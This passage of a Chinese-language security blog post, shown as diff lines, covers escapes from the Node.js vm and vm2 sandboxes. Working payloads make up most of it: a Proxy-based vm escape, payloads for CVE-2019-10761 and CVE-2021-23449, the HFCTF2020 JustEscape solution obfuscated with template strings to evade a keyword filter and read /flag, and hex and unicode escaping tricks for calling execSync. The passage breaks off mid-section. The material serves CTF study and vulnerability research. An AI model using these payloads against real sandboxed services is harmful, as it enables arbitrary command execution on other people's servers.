+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>payload；</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span></span></span></code></pre></div></div><p>结合了示例2，因为throw了个错误，直接到了catch模块，然后<code>console.log(e.message)</code>触发钩子<code>get:</code>。（原理都大差不差了）</p>
+<hr>
+<h2 id="vm2沙箱逃逸">VM2沙箱逃逸</h2>
+<p>引用师傅们的基础</p>
+<ul>
+<li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li>
+<li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li>
+<li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li>
+<li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li>
+</ul>
+<p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor</code>和<code>__proto__</code>这些属性的访问。</p>
+<p>VM运行演示</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">,</span> <span class="nx">VMScript</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VMScript</span><span class="p">(</span><span class="s2">&#34;let a = 2;a;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="k">new</span> <span class="nx">VM</span><span class="p">()).</span><span class="nx">run</span><span class="p">(</span><span class="nx">script</span><span class="p">));</span></span></span></code></pre></div></div><p><code>VM</code>是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。</p>
+<hr>
+<h4 id="cve-2019-10761">（CVE-2019-10761）</h4>
+<p>该漏洞要求vm2版本&lt;=3.6.10</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="sb">``</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>payload:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">write</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ft</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">length</span><span class="o">:</span> <span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">utf8Write</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">r</span><span class="p">(</span><span class="nx">i</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">x</span> <span class="o">=</span> <span class="nx">r</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="o">!==</span><span class="s1">&#39;number&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="o">!==</span><span class="nx">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">x</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">ft</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">i</span><span class="o">=</span><span class="nx">r</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">i</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span></span></span></code></pre></div></div><p>继续引用：</p>
+<p>这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象</p>
+<p>举个例子：</p>
+<p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">r</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>      <span class="c1">// 该函数递归999次
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">f</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">ft</span><span class="p">);</span>    <span class="c1">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">utf8Write</span><span class="p">()</span>   <span class="c1">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱          外的异常对象
+</span></span></span></code></pre></div></div><hr>
+<h4 id="cve-2021-23449">（CVE-2021-23449）</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">vmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">code</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">vmInstance</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">polluted</span><span class="p">);</span></span></span></code></pre></div></div><p>payload1：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">  <span class="nx">res</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="kr">import</span><span class="p">(</span><span class="err">\\</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;.</span><span class="o">/</span><span class="nx">foo</span><span class="p">.</span><span class="nx">js</span><span class="err">\\</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;);</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;)</span>         <span class="nx">res</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">polluted</span> <span class="o">=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="k">return</span> <span class="k">this</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;)().</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">child_process</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;).</span><span class="nx">execSync</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">touch</span> <span class="nx">HACKED</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;).</span><span class="nx">toString</span><span class="p">();</span></span></span></code></pre></div></div><p>payload2：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="n">import</span><span class="p">(</span><span class="s1">&#39;./foo.js&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">.</span><span class="n">toString</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="s2">&#34;return this&#34;</span><span class="p">)()</span><span class="o">.</span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span></span></span></code></pre></div></div><p>payload3：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Symbol</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">get</span> <span class="nx">toStringTag</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="k">new</span> <span class="nx">Map</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">Symbol</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">f</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>这个就看参考好了，解释不出来。</p>
+<h4 id="hfctf2020justescape">（[HFCTF2020]JustEscape）</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="s2">&#34;use strict&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>paylaod:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">get_process</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_process</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})()</span></span></span></code></pre></div></div><p>这道题有关键字waf，用模板字符串拼接可以绕过</p>
+<p>最终payload;</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span> <span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">TypeError</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`prototyp`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">][</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_pro`</span><span class="si">}</span><span class="sb">cess`</span><span class="si">}</span><span class="sb">`</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`return proc`</span><span class="si">}</span><span class="sb">ess`</span><span class="si">}</span><span class="sb">`</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="sb">``</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">e</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_pro`</span><span class="si">}</span><span class="sb">cess`</span><span class="si">}</span><span class="sb">`</span><span class="p">](()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`requir`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`cat /flag`</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})()</span></span></span></code></pre></div></div><h2 id="关键字绕过">关键字绕过</h2>
+<h3 id="一-2">一、</h3>
+<p>nodejs命令执行</p>
+<h4 id="116进制编码">1：16进制编码</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)[</span><span class="s2">&#34;exe\x63Sync&#34;</span><span class="p">](</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span></span></span></code></pre></div></div><h4 id="2unicode编码">2：unicode编码</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)[</span><span class="s2">&#34;exe\u0063Sync&#34;</span><span class="p">](</span><span class="s2">&#34;whomai&#34;</span><span class="p">)</span></span></span></code></pre></div></div><h4 id="3加号拼接">3：加号拼接</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
